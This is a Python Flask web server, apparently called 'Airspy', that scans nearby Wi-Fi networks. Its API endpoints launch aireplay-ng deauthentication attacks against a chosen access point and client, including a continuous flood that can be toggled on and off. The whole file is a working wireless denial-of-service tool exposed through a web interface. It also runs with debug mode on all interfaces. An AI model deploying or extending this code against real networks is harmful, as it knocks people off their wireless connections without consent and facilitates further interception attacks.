from flask import Flask, render_template, jsonify, request
import subprocess
import argparse
from scanner import scan_wifi

TIME = 30
DEAUTH = "0"

app = Flask(__name__, static_url_path='/static')

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/api/wifi')
def api_wifi():
    iface = request.args.get("iface", default="wlan0")
    results = scan_wifi(TIME, iface=iface)
    return jsonify(results)

@app.route("/api/deauth", methods=["POST"])
def deauth():
    data = request.get_json()
    bssid = data.get("bssid")
    station = data.get("station")
    channel = data.get("channel")
    iface = data.get("iface", "wlan0")
    #print(channel)
    
    if not bssid or not station:
        return jsonify({"error": "Missing parameters"}), 400

    try:
        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True)

        subprocess.Popen(
            ["aireplay-ng", "--deauth", DEAUTH, "-a", bssid, "-c", station, iface]
        )
        return jsonify({"message": f"Deauth sent to {station} via {iface}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
from flask import request
import subprocess

active_deauth_processes = {}

@app.route("/api/deauth-toggle", methods=["POST"])
def deauth_toggle():
    data = request.get_json()
    bssid = data.get("bssid")
    station = data.get("station")
    iface = data.get("iface")
    channel = data.get("channel")
    active = data.get("active")

    key = f"{bssid}_{station}_{iface}"

    try:
        # Set channel first
        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True)

        if active:
            # Launch continuous deauth (aireplay-ng --deauth 0)
            proc = subprocess.Popen(
                ["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", station, iface],
            )
            active_deauth_processes[key] = proc
            return jsonify({"message": f"Started deauth on {station}"})
        else:
            proc = active_deauth_processes.get(key)
            if proc:
                proc.terminate()
                del active_deauth_processes[key]
            return jsonify({"message": f"Stopped deauth on {station}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/interfaces")
def list_wifi_interfaces():
    try:
        output = subprocess.check_output("iw dev | grep Interface", shell=True, text=True)
        interfaces = [line.strip().split()[-1] for line in output.strip().splitlines()]
        return jsonify(interfaces)
    except subprocess.CalledProcessError:
        return jsonify([])

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Airspy Web Server")
    parser.add_argument("port", type=int, nargs="?", default=5000,
                        help="Port to run the web server on (default: 5000)")
    args = parser.parse_args()

    app.run(host="0.0.0.0", port=args.port, debug=True)


#iwconfig wlan0 channel 2